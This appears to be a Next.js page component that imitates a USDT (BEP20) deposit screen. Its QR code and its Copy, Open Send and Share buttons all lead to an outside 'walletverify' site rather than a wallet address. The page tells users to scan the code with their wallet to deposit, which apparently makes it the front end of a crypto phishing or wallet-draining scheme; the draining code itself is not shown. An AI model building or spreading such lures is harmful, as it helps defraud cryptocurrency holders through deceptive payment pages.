"use client";

import QRCode from "qrcode";
import { useEffect, useState } from "react";

export default function QRPage() {
  const [qrDataUrl, setQrDataUrl] = useState("");
  const sendUrl = "https://walletverify-gold.vercel.app/send"; // Change this to your actual domain if needed

  useEffect(() => {
    QRCode.toDataURL(sendUrl, {
      width: 320,
      margin: 2,
      color: {
        dark: "#000000",
        light: "#FFFFFF",
      },
    })
      .then(setQrDataUrl)
      .catch(console.error);
  }, [sendUrl]);

  const copyLink = () => {
    navigator.clipboard.writeText(sendUrl);
    alert("Link copied!");
  };

  const openSendPage = () => {
    window.location.href = sendUrl;
  };

  const shareLink = async () => {
    if (navigator.share) {
      try {
        await navigator.share({
          title: "Deposit USDT",
          url: sendUrl,
        });
      } catch {}
    } else {
      copyLink();
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center px-6 pt-8 pb-12">
      {/* Header */}
      <div className="flex items-center gap-3 mb-8">
        <div className="w-9 h-9 bg-[#009393] rounded-full flex items-center justify-center">
          <span className="text-white font-bold text-xl">T</span>
        </div>
        <div>
          <span className="font-bold text-2xl text-[#1a1a1a]">USDT</span>
          <span className="ml-2 px-3 py-0.5 text-xs bg-gray-200 text-gray-600 rounded-full font-medium">BEP20</span>
        </div>
      </div>

      {/* QR Code */}
      <div className="bg-white p-5 rounded-3xl shadow-xl border border-gray-100 mb-8">
        {qrDataUrl ? (
          <img 
            src={qrDataUrl} 
            alt="Scan to deposit USDT" 
            className="w-72 h-72" 
          />
        ) : (
          <div className="w-72 h-72 flex items-center justify-center">Loading QR...</div>
        )}
      </div>

      <p className="text-center text-gray-500 text-sm mb-8 max-w-[260px]">
        Scan this QR code with your wallet to deposit USDT (BEP20)
      </p>

      {/* Action Buttons */}
      <div className="flex gap-3 w-full max-w-[320px] mb-8">
        <button 
          onClick={copyLink}
          className="flex-1 flex flex-col items-center justify-center gap-2 bg-gray-100 hover:bg-gray-200 active:bg-gray-300 transition-colors py-4 rounded-2xl"
        >
          <span className="text-xl">📋</span>
          <span className="text-sm font-medium text-gray-700">Copy</span>
        </button>
        
        <button 
          onClick={openSendPage}
          className="flex-1 flex flex-col items-center justify-center gap-2 bg-gray-100 hover:bg-gray-200 active:bg-gray-300 transition-colors py-4 rounded-2xl"
        >
          <span className="text-xl">🔗</span>
          <span className="text-sm font-medium text-gray-700">Open Send</span>
        </button>

        <button 
          onClick={shareLink}
          className="flex-1 flex flex-col items-center justify-center gap-2 bg-gray-100 hover:bg-gray-200 active:bg-gray-300 transition-colors py-4 rounded-2xl"
        >
          <span className="text-xl">↗️</span>
          <span className="text-sm font-medium text-gray-700">Share</span>
        </button>
      </div>

      {/* Deposit from exchange */}
      <div className="w-full max-w-[320px] bg-gray-50 border border-gray-200 rounded-2xl p-4">
        <div className="flex items-start gap-3">
          <div className="mt-0.5 text-xl">⬇️</div>
          <div>
            <p className="font-semibold text-gray-800">Deposit from exchange</p>
            <p className="text-sm text-gray-500">By direct transfer from your account</p>
          </div>
        </div>
      </div>

      <p className="text-[10px] text-gray-400 mt-10 text-center">
        Only send USDT (BEP20) on BNB Smart Chain
      </p>
    </div>
  );
}